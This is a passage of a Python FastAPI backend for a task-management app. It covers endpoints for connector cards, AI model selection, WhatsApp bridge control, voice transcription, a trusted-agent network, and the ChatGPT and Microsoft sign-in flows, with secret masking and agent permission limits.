        res = read_result(str(r.get('subject') or '').split('—', 1)[-1].strip(), text, bool(r.get('failed')), r.get('said'))
        out.append({'runId': r['runId'], 'at': r['at'], **decide(cfg, res, **chosen)})
    return {'data': out, 'asksAi': asks_ai(cfg), 'prompt': judge_prompt(cfg)}

@app.get('/api/reports/runs/{rid}')
def report_run(rid: int):
    r = store.get_report_run(rid)
    if not r: raise HTTPException(404, 'run not found')
    return r

@app.get('/api/report-types')
def report_types():
    legacy = {'handbook_search', 'handbook_write', 'handbook_vote'}
    from .flow import writes          # a workflow step of this type changes something (the editor's "this only reads" check)
    return {'data': [{'type': t, 'status': 'legacy' if t in legacy else ('planned' if t in PLANNED else 'builtin'), 'writes': writes(t)}
                     for t in REGISTRY]}

@app.get('/api/problems')
def problems_now():
    """What is failing right now, for the bell in the top bar (problems.py): each with where to fix it."""
    from . import problems
    # ...and beside it, what ENDED on its own ("Back on. 14 came in, 2 need you.") - news, never a red count
    return {'data': problems.collect(store), 'news': problems.news(store)}

@app.post('/api/problems/{key:path}/dismiss')
def problem_dismiss(key: str):
    """"I have read this one." It comes back if the same thing fails again (problems.signature),
    so this silences a failure you have decided to live with, never a system that keeps breaking."""
    from . import problems
    try: return problems.dismiss(store, key, ACTOR)
    except ValueError as e: raise HTTPException(404, str(e))

@app.get('/api/connectors')
def connectors(request: Request):
    """Channel connector cards (outlook / teams / github). Secrets are write-only.
    ScopeDefault rides along so the card can show what an unset Authority actually means -
    which is per type (winrm starts at admin, a tracker at read), not one global floor.
    Agents still list cards (they have to pick a tool) but ConfigJson drops credential keys."""
    from . import problems, scopes
    # SignedOut: a stored token is not a sign-in - Microsoft can let it lapse, and the card said "Signed in" over it
    # LastErrorPlain: the card's red line in words - LastError stays raw for problems.lapsed and the Advisor's facts
    from .channels import plain_error_text
    rows = [c | {'ScopeDefault': scopes.default_scope(c['Type']), 'SignedOut': problems.signed_out(c),
                 'LastErrorPlain': plain_error_text(c.get('LastError'))} for c in store.list_connectors()]
    # GatewayBuiltIn: this build ships the organisation gateway's address, so its card's address field is optional (llm.gateway_base)
    from .llm import OPENAI_COMPATIBLE
    rows = [c | {'GatewayBuiltIn': bool(OPENAI_COMPATIBLE['hipaa_ai'][0])} if c['Type'] == 'hipaa_ai' else c for c in rows]
    if guard.scope_of(cfg['server'], request.headers) == guard.AGENT:
        rows = [guard.without_config_secrets(c) for c in rows]
    rows = [guard.masked_config(c) for c in rows]
    from .connectorcatalog import connected_count
    return {'data': rows, 'connected': connected_count(store, cfg.get('cli_connections'))}

@app.get('/api/scopes')
def scope_catalog():
    """The Authority dropdown: the three levels, and for each the actions it unlocks - so the
    card can say what changes when you move it instead of leaving the owner to guess."""
    from . import scopes
    return {'data': [{'value': s, 'actions': scopes.actions_at(s),
                      'gains': sorted(a for a, need in scopes.ACTIONS.items() if need == s)}
                     for s in scopes.SCOPES],
            'defaults': scopes.DEFAULT_SCOPE}

@app.get('/api/brains')
def brains():
    """Everything that could do intent triage: cloud AI connectors with a key, plus your
    CLI tools (through one representative worker each). Value goes into `triage_ai`."""
    from .llm import AI_TYPES
    # no "auto - first active AI connector": a blank setting is the default brain (agents.default_pick), and the
    # card shows that brain by name - which connector was added first never decides (the owner, 2026-09-24)
    out = [{'value': f"connector:{c['ConnectorId']}", 'label': c['Name'], 'kind': 'api',
             'ready': bool(c['Active'] and (c['HasSecret'] or c['Type'] == 'ollama'))}   # local models carry no key
            for c in store.list_connectors() if c['Type'] in AI_TYPES]
    # named by WHAT RUNS, leading with the CLI ('claude · coding'): the profile name is the
    # detail, not the identity - 'coding' says nothing about which model family answers.
    # Each entry also carries its known model choices, so pickers offer a dropdown instead
    # of a spelling test (free typing still allowed for models we don't know about).
    CONN_MODELS = {'anthropic': ['claude-opus-5', 'claude-sonnet-5', 'claude-haiku-4-5'],
                   'openai': ['gpt-4o-mini'],
                   'openrouter': ['openrouter/auto', 'meta-llama/llama-3.3-70b-instruct'],
                   # the private tier leads; -contributor is a data-sharing choice, not a default
                   'meta': ['muse-spark-1.2', 'muse-spark-1.3', 'muse-spark-1.2-contributor']}
    for o in out:
        if o['kind'] == 'api':
            c = store.get_connector(int(o['value'][10:]))
            o['models'] = CONN_MODELS.get((c or {}).get('Type'), [])
    settings = store.get_settings()
    selected = str(settings.get('triage_ai') or '')
    preferred = ([selected[4:]] if selected.startswith('cli:') else [])
    preferred += [x.strip()[4:] for x in str(settings.get('triage_backup_ai') or '').split(',')
                  if x.strip().startswith('cli:')]
    preferred += [hub_agents.default_brain(store)]
    # A brain is a CLI TOOL or an AI connection, never a profile: one entry per connected CLI, its value the tool's own key
    # (the owner, 2026-10-15: "it's models or cli tools only"). Its gears live on the connection.
    from . import climodels
    out += [{'value': f"cli:{o['value']}", 'label': words.local(o['label']),
             'kind': 'cli', 'ready': o['ready'],
             'models': climodels.catalog(o['cli'])['choices']}
            for o in hub_agents.cli_agent_options(store, preferred=preferred)]
    # An API provider with no key cannot be picked, and fifteen greyed rows made the menu taller than the page with
    # the CLIs at the bottom (the owner, 2026-09-24: "drop down is too big"). One already in use stays listed.
    used = {str(settings.get(k) or '') for k in ('triage_ai', 'triage_backup_ai', 'concierge_ai', 'assistant_ai', 'judge_ai', 'draft_ai')}
    out = [o for o in out if o['kind'] != 'api' or o['ready'] or o['value'] in used]
    current = store.get_setting('triage_ai') or ''
    # Old settings named a type (connector:anthropic). Keep accepting that in llm.py, but
    # point the picker at the concrete instance it currently resolves to.
    if current.startswith('connector:') and not current[10:].isdigit():
        old = store.get_connector_by_type(current[10:])
        if old: current = f"connector:{old['ConnectorId']}"
    return {'data': out, 'current': current}

@app.post('/api/connectors')
def save_connector(body: ConnectorBody):
    fields = {k: (int(v) if k == 'Active' else v) for k, v in body.model_dump().items() if v is not None}
    if fields.get('Name') is not None:
        fields['Name'] = fields['Name'].strip()
        if not fields['Name']: raise HTTPException(422, 'connector name cannot be blank')
    if fields.get('Roles') is not None:
        bad = {r for r in fields['Roles'].split(',') if r} - set(store_mod.ROLES)
        if bad: raise HTTPException(422, f"unknown role(s): {', '.join(sorted(bad))}")
    if fields.get('Scope') is not None:
        from . import scopes
        if fields['Scope'] not in scopes.SCOPES:
            raise HTTPException(422, f"unknown authority: {fields['Scope']} - one of {', '.join(scopes.SCOPES)}")
    if not fields.get('ConnectorId') and not (fields.get('Type') and fields.get('Name')):
        raise HTTPException(422, 'new connectors need Type and Name')
    if not fields.get('ConnectorId'):
        # New instances start with the normal role for their type, but never inherit credentials,
        # cursors, sources or test state from the card they were added beside.
        fields.setdefault('Roles', store_mod.DEFAULT_ROLES.get(fields['Type'], ''))
    current = store.get_connector(fields['ConnectorId']) if fields.get('ConnectorId') else None
    typ = fields.get('Type') or (current or {}).get('Type')
    if current and fields.get('ConfigJson') is not None:
        fields['ConfigJson'] = guard.keep_write_only(typ, fields['ConfigJson'], current.get('ConfigJson'))
    name = fields.get('Name') or (current or {}).get('Name')
    if typ and name and any(c['Name'].casefold() == name.casefold()
                            and c['ConnectorId'] != fields.get('ConnectorId')
                            for c in store.connectors_by_type(typ)):
        raise HTTPException(409, f'a {typ} connector named {name!r} already exists')
    if typ == 'hipaa_ai' and fields.get('ConfigJson'):
        # the gateway address saved as every reader of it expects it: https, ending /v1 (llm.gateway_url)
        from . import llm
        try: conf = json.loads(fields['ConfigJson'])
        except ValueError: conf = None
        if isinstance(conf, dict) and conf.get('base_url'):
            try: fields['ConfigJson'] = json.dumps({**conf, 'base_url': llm.gateway_url(conf['base_url'])})
            except ValueError as e: raise HTTPException(422, str(e))
    cid = store.save_connector(fields, ACTOR)
    safe = {k: v for k, v in fields.items() if k != 'Secret'} | ({'secret': 'updated'} if 'Secret' in fields else {})
    store.audit('connector', cid, 'edit' if body.ConnectorId else 'create', ACTOR, detail=safe)
    discovery = None
    # a new GitHub PAT is all the config there is: saving the token IS connecting - and
    # re-ENABLING the connector re-runs discovery too (refreshes the SOUL.md repo map,
    # incl. README summaries for repos with no description)
    c = store.get_connector(cid, with_secret=True) or {}
    if c.get('Type') == 'github' and c.get('Secret') and ('Secret' in fields or fields.get('Active')):
        try:
            from .channels import github_discover
            discovery = github_discover(store, c, ACTOR)
        except Exception as e:
            from .channels import plain_failure
            discovery = {'error': plain_failure(e)}      # shown under Save: "401 Client Error ... api.github.com" helped nobody
    # an organisation's AI card switched on here: each job still unpointed goes to the model that fits it (firstrun.models_by_job)
    if c.get('Type') == 'hipaa_ai' and c.get('Active') and c.get('Secret') and ('Secret' in fields or fields.get('Active')):
        from . import firstrun
        discovery = firstrun.models_by_job(store, cfg, cid, only_blank=True)
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    return {'ok': True, 'connectorId': cid, 'discovery': discovery}

@app.get('/api/connectors/{cid}/uses')
def connector_uses(cid: int):
    """What leans on this card - the line beside its Remove (dependents.py)."""
    if not store.get_connector(cid): raise HTTPException(404, 'connector not found')
    from . import dependents
    return {'data': dependents.of(store, cid)}

@app.post('/api/connectors/{cid}/reset')
def connector_reset(cid: int):
    c = store.get_connector(cid)
    if not c: raise HTTPException(404, 'connector not found')
    # at once, with the page's Undo: its sealed sign-in is kept for the Undo line's minutes, then forgotten (recentlydeleted.py)
    from . import recentlydeleted
    out = recentlydeleted.remove_connection(store, cid, c.get('Name') or c['Type'])
    store.audit('connector', cid, 'reset', ACTOR, detail={'type': c['Type']})
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    return {'ok': True, **out}

@app.get('/api/deps')
def deps_list():
    """What the cards can install, where it would land, and what this build already ships."""
    can, why = deps.can_install()
    return {'can_install': can, 'why': why, 'python': sys.executable, 'frozen': deps.frozen(),
            'where': str(deps.packages_dir()) if deps.frozen() else sys.executable,
            'packages': {k: {'name': deps.pip_name(k), 'installed': deps.installed(k),
                             'bundled': deps.frozen() and k in deps.BUNDLE} for k in deps.OPTIONAL}}


@app.post('/api/deps/install')
def deps_install(body: dict):
    """Install one optional package where THIS Taskuary imports from. The owner's button - it is
    on guard.DENIED, because pip runs arbitrary setup code and an agent asking for that is an
    agent asking to run anything."""
    pkg = str((body or {}).get('package') or '')
    try: out = deps.install(pkg)
    except ValueError as e: raise HTTPException(422, str(e))
    except Exception as e: raise HTTPException(400, str(e))
    store.audit('connector', 0, 'dependency_installed', ACTOR, detail={'package': pkg})
    return out


def _failed_test(cid: int, name: str, out: dict):
    """A test that failed, left on the connector (failures.record_on): the card said it once, and nothing could read it after."""
    try: failures.record_on(store, 'connector', cid, kind='connection.test', error=out.get('detail') or 'the test failed', what=f'{name} failed its test', name=name)
    except Exception as e: logger.debug(f'the failed test of connector {cid} was not recorded: {e}')

@app.post('/api/connectors/{cid}/test')
def connector_test(cid: int):
    from .channels import test_connector
    c = store.get_connector(cid)
    if not c: raise HTTPException(404, 'connector not found')
    out = test_connector(store, cid)
    store.audit('connector', cid, 'test_ok' if out['ok'] else 'test_failed', ACTOR, detail=out['detail'])
    if not out['ok']: _failed_test(cid, c.get('Name') or c.get('Type'), out)
    # the test rewrote LastError, which the rail does not count as a change (touch_connector): without this the pile kept the old
    # error, Next put the row down under it, and the new one raised it again the moment Next was pressed (the card's Check again)
    from . import funnel
    funnel.invalidate()
    return out

# ── Reason Network (reasonnet.py): teammates' agents - only the ones the owner trusts ──
def _reason(f):
    "One call to the owner's own reason-network: what it cannot do is a 422 in its words, what went wrong a 502 - never a 500."
    from . import reasonnet as rn
    try: return f()
    except (rn.Unsupported, rn.NotInstalled, rn.Miss, ValueError) as e: raise HTTPException(422, str(e))
    except Exception as e: raise HTTPException(502, str(e) or type(e).__name__)


def _reason_card():
    from . import reasonnet as rn
    if demo.enabled(): raise HTTPException(409, 'the demo has no Reason Network')
    c = rn.connector(store)
    if not c: raise HTTPException(404, 'the Reason Network card is missing')
    return rn, c


@app.get('/api/reason/status')
def reason_status():
    from . import reasonnet as rn
    return rn.demo_status() if demo.enabled() else rn.status(store)


@app.post('/api/reason/trusted')
def reason_trusted(payload: dict):
    """The people (or single sessions) the owner trusts. With the gate on, Reason's own policy follows at once."""
    rn, c = _reason_card()
    cfg = rn.save_settings(store, c, ACTOR, trusted=rn.clean_trusted(payload.get('trusted') or []))
    store.audit('connector', c['ConnectorId'], 'reason_trusted', ACTOR, detail={'trusted': cfg['trusted']})
    gate = _reason(lambda: rn.apply_gate(cfg['trusted'], rn.me(refresh=True))) if cfg['gate'] and rn.exe() else None
    return {'trusted': cfg['trusted'], 'gate': gate}


@app.post('/api/reason/gate')
def reason_gate(payload: dict):
    """Only trusted people reach agents on this computer: Reason's inbound default becomes hold (reasonnet.apply_gate), and
    the Assistant's own folder goes off the network with it. Off puts Reason's default back to accept."""
    rn, c = _reason_card()
    on = payload.get('on') is not False
    def go():
        name = rn.me(refresh=True)
        if on and not name: raise rn.Miss("Reason Network didn't say who you are on it - finish its own setup first (reason-network setup).")
        g = rn.apply_gate(rn.settings(c)['trusted'], name, on)
        if on and rn.has('folder'): rn.folder(rn.assistant_folder(), True)
        return g
    g = _reason(go)
    rn.save_settings(store, c, ACTOR, gate=on)
    store.audit('connector', c['ConnectorId'], 'reason_gate', ACTOR, detail={'on': on})
    return {'gate': g}


@app.post('/api/reason/folder')
def reason_folder(payload: dict):
    "One repository's checkout (or the Assistant's folder) off the network or back on - reason-network folder <path> off|on."
    rn, c = _reason_card()
    path, off = str(payload.get('path') or ''), payload.get('off') is not False
    if path not in set(rn.checkouts(store).values()) | {rn.assistant_folder()}:
        raise HTTPException(422, "only a repository's checkout Taskuary knows, or the Assistant's folder")
    said = _reason(lambda: rn.folder(path, off))
    cur = rn.settings(c)['off']
    rn.save_settings(store, c, ACTOR, off=[*cur, path] if off and path not in cur else [p for p in cur if p != path or off])
    store.audit('connector', c['ConnectorId'], 'reason_folder', ACTOR, detail={'path': path, 'off': off})
    return {'said': said}


@app.post('/api/reason/held/{mid}')
def reason_held(mid: str, payload: dict):
    "A held message from someone untrusted: delivered as it is, or dropped - the owner's word, said on its task."
    rn, c = _reason_card()
    deliver = payload.get('deliver') is True
    said = _reason(lambda: rn.settle([mid], deliver))
    store.audit('connector', c['ConnectorId'], 'reason_delivered' if deliver else 'reason_dropped', ACTOR, detail={'id': mid})
    tid = rn.state()['held'].get(mid)
    if tid and store.get_task(int(tid)):
        store.add_comment(int(tid), ACTOR, 'human', 'You delivered it to the agent it was for.' if deliver else 'You dropped it - no agent saw it.')
    return {'said': said}


@app.post('/api/tasks/{tid}/reason-ask')
def task_reason_ask(tid: int, payload: dict):
    "Ask a trusted teammate's agent about this task; the question and the reply are notes on it (reasonnet.ask)."
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    if demo.enabled(): raise HTTPException(409, 'the demo has no Reason Network')
    from . import reasonnet as rn
    return _reason(lambda: rn.ask(store, tid, str(payload.get('to') or ''), str(payload.get('text') or ''), ACTOR))


# ── Voice (taskuary/voice.py): speech to text for the funnel and for the prompt box ──
@app.get('/api/voice/status')
def voice_status():
    from . import voice
    return voice.ready(store)

@app.get('/api/voice/vocabulary')
def voice_vocabulary():
    from . import voice
    return {'terms': voice.vocabulary(store), 'limit': voice.VOCAB_MAX}

@app.put('/api/voice/vocabulary')
def voice_vocabulary_save(body: dict):
    from . import voice
    try: terms = voice.save_vocabulary(store, body.get('terms'), ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    store.audit('setting', 0, 'voice_vocabulary', ACTOR, detail={'count': len(terms)})
    return {'terms': terms, 'limit': voice.VOCAB_MAX}

@app.post('/api/voice/transcribe')
async def voice_transcribe(request: Request):
    """A clip from the browser's microphone, posted as the raw body (no multipart dependency):
    the text comes back and goes wherever the prompt box goes."""
    from . import voice
    data = await request.body()
    if not data: raise HTTPException(422, 'no audio in the request')
    mime = (request.headers.get('content-type') or 'audio/webm').split(';')[0].strip()
    # a call to the transcription service, seconds long: on the loop it froze every pane and request until it answered
    try: return await run_in_threadpool(voice.transcribe, store, data, mime, f'clip.{voice.ext_for(mime)}')
    except RuntimeError as e: raise HTTPException(409, str(e))
    except requests.RequestException as e: raise HTTPException(502, f'could not reach the transcription service: {str(e)[:160]}')

@app.post('/api/messages/{mid}/transcribe')
def message_transcribe(mid: int):
    """A voice note that landed untranscribed (no connector at the time): the audio is attached,
    so it is transcribed now and the body replaced."""
    from . import voice
    try: out = voice.transcribe_message(store, mid)
    except RuntimeError as e: raise HTTPException(409, str(e))
    store.audit('message', mid, 'transcribed', ACTOR, detail={'provider': out['provider']})
    return out

@app.get('/api/connectors/{cid}/mail/folders')
def mail_folder_list(cid: int, mailbox: str):
    """A mailbox's folders, for the Mailboxes step: which ones this source reads (Inbox by default)."""
    from .channels import graph_token, mail_folders
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'outlook': raise HTTPException(404, 'folders are an Outlook card thing')
    try:
        tok = graph_token({**json.loads(c.get('ConfigJson') or '{}'), '_cid': cid}, c.get('Secret'))
        return {'data': mail_folders(tok, mailbox)}
    except requests.HTTPError as e: raise HTTPException(502, f'Graph refused the folder list: {str(e)[:160]}')
    except RuntimeError as e: raise HTTPException(409, str(e))

@app.get('/api/connectors/{cid}/wa/status')
def wa_status(cid: int):
    """Paired or not - the pairing QR as an SVG for the card to draw (messengers.wa_status), and
    what Taskuary's own bridge manager is doing (installing, starting, running, failed)."""
    from .messengers import wa_status as _status
    from . import wabridge
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'whatsapp': raise HTTPException(404, 'not a WhatsApp connector')
    from . import demo
    if demo.enabled(): return {'connected': False, 'bridge': False, 'node': False, 'manager': {}, 'detail': 'the demo has no bridge - nothing real is reachable from here'}
    # node: the one thing the card cannot install for the owner - step 1 of the pairing box turns on it
    try: return {**_status(c), 'bridge': True, 'node': True, 'manager': wabridge.state()}
    except RuntimeError as e: return {'connected': False, 'bridge': False, 'node': bool(wabridge.node()), 'detail': str(e), 'manager': wabridge.state()}   # bridge down is a state, not a 500

@app.post('/api/connectors/{cid}/wa/bridge/start')
def wa_bridge_start(cid: int, force_install: bool = False):
    """Install the bridge's dependency if needed and start it detached - the card's button and the
    setup agent's verb, instead of a shell command that never returns (wabridge.py)."""
    from . import wabridge
    c = store.get_connector(cid)
    if not c or c['Type'] != 'whatsapp': raise HTTPException(404, 'not a WhatsApp connector')
    store.audit('connector', cid, 'wa_bridge_start', ACTOR)
    return wabridge.start(force_install, filter_policy=wabridge.filter_policy(store, cid))

@app.post('/api/connectors/{cid}/wa/bridge/stop')
def wa_bridge_stop(cid: int):
    from . import wabridge
    return wabridge.stop(hold=True)              # stopped on purpose: the supervisor does not start it again

@app.post('/api/connectors/{cid}/wa/bridge/restart')
def wa_bridge_restart(cid: int):
    """Stop the running bridge (ours or one started by hand - found by its port) and start the one on
    disk: how a paired bridge picks up newer bridge code without the owner touching a shell."""
    from . import wabridge
    c = store.get_connector(cid)
    if not c or c['Type'] != 'whatsapp': raise HTTPException(404, 'not a WhatsApp connector')
    store.audit('connector', cid, 'wa_bridge_restart', ACTOR)
    return wabridge.restart(filter_policy=wabridge.filter_policy(store, cid))

@app.post('/api/connectors/{cid}/wa/bridge/pair-again')
def wa_bridge_pair_again(cid: int):
    """Unlink this device, set its pairing aside and start the bridge unpaired - the card then shows the QR (wabridge.pair_again).
    The card's button when the bridge is logged out, or when the contact-name sync keeps failing for a missing key."""
    from . import wabridge
    c = store.get_connector(cid)
    if not c or c['Type'] != 'whatsapp': raise HTTPException(404, 'not a WhatsApp connector')
    store.audit('connector', cid, 'wa_bridge_pair_again', ACTOR)
    return wabridge.pair_again(filter_policy=wabridge.filter_policy(store, cid))

@app.get('/api/connectors/{cid}/wa/chats')
def wa_chats(cid: int):
    """Chats reachable through the paired WhatsApp account, for compose and inbound sources."""
    from .messengers import wa_chats as _chats
    c = store.get_connector(cid, with_secret=True)
    if not c or c['Type'] != 'whatsapp': raise HTTPException(404, 'not a WhatsApp connector')
    from . import remote_assistant
    try: rows = _chats(c, store)
    except RuntimeError as e: raise HTTPException(409, str(e))
    # The owner's own "Message yourself" thread wears a legacy GROUP jid, and so does every group
    # they created - the shape and the number prefix cannot tell those apart, so the count of people
    # in the room does (remote_assistant.own_thread).
    guide = remote_assistant.chat_of(c)
    for r in rows: r['self'] = bool(r.get('group')) and remote_assistant.own_thread(store, c, r, guide)
    return {'data': rows}

# ── Get AI to set it up (taskuary/aisetup.py): the card's guide as the agent's prompt, live on the card ──
@app.post('/api/connectors/{cid}/ai-setup')
def connector_ai_setup(cid: int, body: AiSetupBody):
    c = store.get_connector(cid)
    # WhatsApp pairs itself (Node check, bridge auto-start, QR on the card); an agent here only sat on the bridge process
    if c and c['Type'] == 'whatsapp': raise HTTPException(422, 'WhatsApp needs no agent: the Pair with your phone box does the setup itself')
    # the GENERAL agent walks the card (aisetup.start_walk, the owner 2026-10-21) - not a coding CLI in a terminal
    try: return aisetup.start_walk(store, cid, _walk_ctx(body), ACTOR)
    except (ValueError, RuntimeError, FileNotFoundError) as e: raise HTTPException(422, str(e))

def _walk_ctx(body): return {'guide': body.guide or [], 'fields': body.fields or [], 'secret_label': body.secret_label or '', 'agent_steps': body.agent_steps or []}

@app.get('/api/connectors/{cid}/ai-setup')
def connector_ai_setup_live(cid: int):
    """The card's walk as it stands - its steps, what the agent is doing now, the step it needs from the person - and `ready`:
    whether any brain could take a new one, so the card can say where to get one instead of a button that only answers
    "not found" (B10)."""
    why = aisetup.ready_why(store)
    return {**aisetup.walk_view(store, cid), 'ready': not why, 'why': why}

class AiSetupTurn(AiSetupBody): text: str = ''; saved: list[str] = []

@app.post('/api/connectors/{cid}/ai-setup/say')
def connector_ai_setup_say(cid: int, body: AiSetupTurn):
    """The person answered the walk: words typed on the card, or the fields they just saved there."""
    try: return aisetup.walk_said(store, cid, _walk_ctx(body), body.text, body.saved)
    except ValueError as e: raise HTTPException(409, str(e))

@app.post('/api/connectors/{cid}/ai-setup/done')
def connector_ai_setup_done(cid: int):
    t = aisetup.walk_task(store, cid)
    if not t: return {'wrap': 'none'}
    return aisetup.finish_walk(store, t['TaskId'], ACTOR)

# ── Sign in with ChatGPT (taskuary/chatgptauth.py): the owner's ChatGPT plan as a brain, no API key ──
def _chatgpt_card(cid):
    c = store.get_connector(cid)
    if not c or c['Type'] != 'chatgpt': raise HTTPException(404, 'Sign in with ChatGPT lives on the ChatGPT card')
    return c, json.loads(c.get('ConfigJson') or '{}')

@app.post('/api/connectors/{cid}/chatgpt/signin')
def chatgpt_signin(cid: int):
    """Start the browser sign-in: the URL the page opens, and a flow id to poll with. The browser comes back to a
    listener on 127.0.0.1 that lives only for this attempt."""
    from . import chatgptauth, firstrun
    _c, cfg = _chatgpt_card(cid)
    store.set_setting(firstrun.FIX, '', ACTOR)                  # a new attempt: the last pick's failure is not this one's
    try: return chatgptauth.start(cfg)
    except RuntimeError as e: raise HTTPException(409, str(e))

@app.post('/api/connectors/{cid}/chatgpt/poll')
def chatgpt_poll(cid: int, body: dict):
    """pending until the browser comes back; then the card is signed in as them - the refresh token is its secret, the
    issued client id and this install's host id its config."""
    from . import chatgptauth, firstrun
    _c, cfg = _chatgpt_card(cid)
    # A SIGN-IN THAT FAILED IS SAID ON ITS CARD, and anything that goes wrong ends it (the owner, 2026-10-20: the sign-in failed,
    # the card still said "finish signing in", and closed and opened again it read "Not set up" as if nothing had happened): the
    # failure is the card's LastError - its red dot and its words - until a sign-in works
    # ...and setup's own fix, like a key or a CLI that failed (firstrun.FIX): a failure on another card stood alone over this one,
    # and the ChatGPT card just pressed was nowhere on the screen
    def failed(why):
        said = f"The ChatGPT sign-in didn't finish: {why}"
        store.touch_connector(cid, said)
        store.set_setting(firstrun.FIX, json.dumps({'key': f'c{cid}', 'name': 'chatgpt', 'title': 'ChatGPT', 'fix': '', 'setup': '', 'install': '',
                                                    'why': f'{said.rstrip(".")}. Pick ChatGPT to try again, or pick another AI.', 'detail': ''}), ACTOR)
        return {'status': 'error', 'detail': why}
    try: t = chatgptauth.poll((body or {}).get('flow') or '')
    except RuntimeError as e: return failed(str(e))
    except requests.RequestException as e: return failed(f'could not reach auth.openai.com: {str(e)[:160]}')
    # ...a 500 here (an answer that was not JSON) left the page polling over a sign-in that was already over
    except Exception as e:
        logger.warning(f'chatgpt sign-in poll failed: {e!r}')
        return failed(f'the answer from OpenAI could not be read ({type(e).__name__})')
    if t.get('pending'): return {'status': 'pending'}
    cfg = {**cfg, 'auth': 'user', 'client_id': t['client_id'], 'host_id': t['host_id'], 'account': t['email'], 'name': t['name'],
           'sub': t['sub'], 'granted_scope': t['scope']}
    store.save_connector({'ConnectorId': cid, 'ConfigJson': json.dumps(cfg), 'Secret': t['refresh_token'], 'Active': 1}, ACTOR)
    store.audit('connector', cid, 'chatgpt_signin', ACTOR, detail={'account': t['email']})
    store.touch_connector(cid)                                  # the last failure is over
    # ...and with no brain chosen, the one just signed in IS the brain, now - "Pick it as a brain under Settings" sent a
    # first-time owner off to a page they had never seen, and the mail sat untriaged meanwhile (a first-run log, 2026-10-14)
    adopted = not str(store.get_setting('triage_ai') or '').strip()
    if adopted:
        store.set_setting('triage_ai', f'connector:{cid}', ACTOR)
        brain_arrived()
    return {'status': 'ok', 'account': t['email'], 'name': t['name'], 'adopted': adopted}

@app.post('/api/connectors/{cid}/chatgpt/cancel')
def chatgpt_cancel(cid: int, body: dict):
    """Cancel on the card. Stopping only the page left the listener up: a sign-in finished in the open tab showed
    success in the browser, and the app never collected it."""
    from . import chatgptauth
    _chatgpt_card(cid)
    chatgptauth.cancel((body or {}).get('flow') or '')
    return {'ok': True}

@app.post('/api/connectors/{cid}/chatgpt/signout')
def chatgpt_signout(cid: int):
    """End the session at OpenAI and forget it here. The host id stays: this install is the same host next time."""
    from . import chatgptauth
    c, cfg = _chatgpt_card(cid)
    keep = {k: v for k, v in cfg.items() if k in ('host_id', 'model')}
    # signed out here at once; the session is ended at OpenAI once the page's Undo has passed (recentlydeleted.purge) - a
    # revoked session could never be undone
    from . import recentlydeleted
    out = recentlydeleted.sign_out(store, cid, c.get('Name') or 'ChatGPT', keep, revoke='chatgpt', cfg_before=cfg)
    store.audit('connector', cid, 'chatgpt_signout', ACTOR)
    return {'ok': True, **out}

# ── Sign in with Microsoft (taskuary/msauth.py): Graph for a regular user, no Azure portal ──
_MSFLOWS = {}   # flow id -> the device code being polled; one browser tab, minutes, then gone

class MsSignInBody(BaseModel):
    files: bool | None = None        # Allow saving files: this sign-in asks for Files.ReadWrite too (None: as the card already says)


@app.post('/api/connectors/{cid}/ms/signin')
def ms_signin(cid: int, body: MsSignInBody | None = None):
    """Start the device-code sign-in: the code and URL to show, and a flow id to poll with. `files` turns the card's "Allow saving
    files" on or off - the scopes asked for follow it, and the card keeps the choice once the sign-in completes (ms_poll)."""
    import secrets as _secrets
    from . import msauth
    c = _ms_card(cid)
    cfg = json.loads(c.get('ConfigJson') or '{}')
    if body is not None and body.files is not None: cfg['allow_files'] = bool(body.files)
    try: d = msauth.device_start(cfg, msauth.scopes_for(c['Type'], bool(cfg.get('allow_files'))))
    except RuntimeError as e: raise HTTPException(409, str(e))
    except requests.RequestException as e: raise HTTPException(502, f'could not reach login.microsoftonline.com: {str(e)[:160]}')
    flow = _secrets.token_urlsafe(12)
    for k, v in list(_MSFLOWS.items()):
        if time.time() - v['at'] > 1800: _MSFLOWS.pop(k, None)
    _MSFLOWS[flow] = {'cid': cid, 'kind': c['Type'], 'device_code': d.pop('device_code'), 'cfg': cfg, 'at': time.time()}
    return {'flow': flow, **d}

def _reads(cid):
    c = store.get_connector(cid) if cid else None
    return bool(c and c.get('Active') and c.get('HasSecret'))

def _ms_card(cid):
    """Outlook and Teams both sign in with Microsoft, each card its own account (a Teams card asks for chat scopes)."""
    c = store.get_connector(cid)
    if not c or c['Type'] not in ('outlook', 'teams'): raise HTTPException(404, 'Sign in with Microsoft lives on the Outlook and Teams cards')
    return c

@app.post('/api/connectors/{cid}/ms/poll')
def ms_poll(cid: int, body: dict):
    """One poll of a sign-in. pending until the user finishes in the browser; then the card is
    connected as them: refresh token saved as the secret, their mailbox added as the source."""
    from . import msauth
    flow = (body or {}).get('flow')
    f = _MSFLOWS.get(flow)
    if not f or f['cid'] != cid: raise HTTPException(404, 'no such sign-in in progress - start it again')
    try: t = msauth.device_poll(f['cfg'], f['device_code'])
    except msauth.AdminConsent as e:
        _MSFLOWS.pop(flow, None)
        return {'status': 'error', 'detail': str(e), 'admin_consent_url': msauth.admin_consent_url(f['cfg'], msauth.scopes_for(f.get('kind'), bool(f['cfg'].get('allow_files'))))}
    except RuntimeError as e:
        _MSFLOWS.pop(flow, None)
        return {'status': 'error', 'detail': str(e)}
    if t.get('pending'): return {'status': 'pending'}
    _MSFLOWS.pop(flow, None)
    if not t.get('refresh_token'):
        return {'status': 'error', 'detail': 'Microsoft returned no refresh token - the offline_access scope was not granted'}
    who = msauth.me(t['access_token'])
    # THE SAME ACCOUNT ON A SECOND CARD is two pollers on one mailbox: the card that already reads it says so, and this one
    # stays as it was - "Add another" is for another account, and the sign-in page picks whichever one the browser has open.
    # Asked of cards of ONE kind: the same account on an Outlook and a Teams card is one mailbox and one set of chats
    kind = f.get('kind') or 'outlook'
    other = next((x for x in store.connectors_by_type(kind) if x['ConnectorId'] != cid and x.get('Active') and x.get('HasSecret')
                  and str(json.loads(x.get('ConfigJson') or '{}').get('account') or '').lower() == (who['account'] or '').lower()),
                 None) if who['account'] else None
    if other:
        return {'status': 'error', 'detail': f"{who['account']} is already signed in on the {other['Name']} card - sign in here "
                                             "with a different Microsoft account (choose Use another account on Microsoft's page)"}
    cfg = {**f['cfg'], 'auth': 'user', 'account': who['account'], 'name': who['name'],
           **({'granted_scope': t['scope']} if t.get('scope') else {})}      # what was granted, for the send probe (PW-143)
